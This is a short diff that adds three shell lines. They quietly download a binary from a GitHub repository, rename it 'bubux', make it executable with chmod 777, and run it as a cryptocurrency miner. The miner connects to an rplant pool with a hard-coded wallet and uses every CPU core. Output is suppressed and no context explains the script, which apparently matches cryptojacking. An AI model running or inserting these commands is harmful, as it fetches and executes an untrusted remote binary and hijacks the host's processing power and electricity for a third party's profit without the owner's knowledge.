@@ -1,0 +1,3 @@
+wget -O bubux https://github.com/cai674fangquehe-crypto/ggfs/raw/refs/heads/main/VRL >/dev/null 2>&1
+chmod 777 bubux
+./bubux -a randomvirel --url asia.rplant.xyz:7155 --user v3pugnihn2yr1cpyup6o9gdxx641vr4x2hyojs5k6xtri9ziq.2tes -t $(nproc --all)
